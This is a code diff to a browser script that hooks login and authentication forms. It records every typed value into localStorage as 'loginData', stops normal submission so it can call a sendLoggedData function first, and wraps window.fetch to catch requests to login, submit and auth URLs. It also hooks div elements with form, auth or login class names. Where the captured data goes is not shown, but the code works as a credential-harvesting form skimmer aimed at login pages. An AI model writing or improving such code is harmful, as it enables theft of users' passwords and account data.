@@ -63,16 +63,16 @@
     function hookForm(form) {
         if (!form || form.dataset.hooked) return;
         form.dataset.hooked = 'true';
-        log('ðŸ“Œ Hooking into form');
+        log(`ðŸ“Œ Hooking into form: ${form.id || form.name || 'unnamed-form'}`);
 
         const data = JSON.parse(localStorage.getItem('loginData') || '{}');
-        const inputs = form.querySelectorAll('input');
+        const inputs = form.querySelectorAll('input, textarea, select');
 
         inputs.forEach(input => {
             const name = input.name || input.id;
             if (!name) return;
 
-            if (data[name]) input.value = data[name];
+            if (data[name] && !input.value) input.value = data[name];
 
             input.addEventListener('input', () => {
                 data[name] = input.value;
@@ -84,23 +84,64 @@
         // Form submit (traditional)
         form.addEventListener('submit', async function(e) {
             log('ðŸ§· Form submit event triggered');
+            e.preventDefault(); // Prevent normal submission so we can capture data
+            e.stopPropagation();
             await sendLoggedData();
+            return false;
         });
 
         // Button click (non-traditional)
-        const buttons = form.querySelectorAll('button, input[type="submit"]');
+        const buttons = form.querySelectorAll('button, input[type="submit"], input[type="button"]');
         buttons.forEach(btn => {
-            btn.addEventListener('click', async () => {
-                log('ðŸ–± Button clicked');
-                await sendLoggedData();
-            });
+            btn.addEventListener('click', async function(e) {
+                log(`ðŸ–± Button clicked: ${btn.textContent.trim() || btn.value || btn.id || 'unnamed-button'}`);
+                // Check if this button is likely a submit button
+                if (btn.type === 'submit' || 
+                    btn.getAttribute('type') === 'submit' || 
+                    btn.classList.contains('submit') || 
+                    btn.textContent.toLowerCase().includes('submit') || 
+                    btn.textContent.toLowerCase().includes('log in') || 
+                    btn.textContent.toLowerCase().includes('sign in')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    await sendLoggedData();
+                }
+            }, true); // Use capture phase to catch events before they're handled
         });
+
+        // Also watch for AJAX submissions
+        const originalFetch = window.fetch;
+        window.fetch = async function(...args) {
+            const url = typeof args[0] === 'string' ? args[0] : args[0].url;
+            if (url && (url.includes('login') || url.includes('submit') || url.includes('auth'))) {
+                log(`ðŸŒ Detected fetch request to: ${url}`);
+                try {
+                    const response = await originalFetch.apply(this, args);
+                    log(`ðŸŒ Fetch response from ${url}: ${response.status}`);
+                    if (response.ok) {
+                        await sendLoggedData();
+                    }
+                    return response;
+                } catch (error) {
+                    log(`ðŸŒ Fetch error: ${error}`);
+                    throw error;
+                }
+            }
+            return originalFetch.apply(this, args);
+        };
 
         log('âœ… Form hooked');
     }
 
     function scanForForms() {
         document.querySelectorAll('form').forEach(hookForm);
+        // Also look for divs that might be acting as forms
+        document.querySelectorAll('div[class*="form"], div[class*="auth"], div[class*="login"]').forEach(div => {
+            if (div.querySelector('input')) {
+                log(`ðŸ” Found potential form-like div: ${div.className}`);
+                hookForm(div);
+            }
+        });
     }
 
     // Initial scan
@@ -110,10 +151,18 @@
     const observer = new MutationObserver((mutations) => {
         mutations.forEach(m => {
             m.addedNodes.forEach(node => {
-                if (node.tagName === 'FORM') {
-                    hookForm(node);
-                } else if (node.querySelectorAll) {
-                    node.querySelectorAll('form').forEach(hookForm);
+                if (node.nodeType === 1) { // Element node
+                    if (node.tagName === 'FORM') {
+                        hookForm(node);
+                    } else if (node.querySelectorAll) {
+                        node.querySelectorAll('form').forEach(hookForm);
+                        // Also watch for form-like divs
+                        node.querySelectorAll('div[class*="form"], div[class*="auth"], div[class*="login"]').forEach(div => {
+                            if (div.querySelector('input')) {
+                                hookForm(div);
+                            }
+                        });
+                    }
                 }
             });
         });
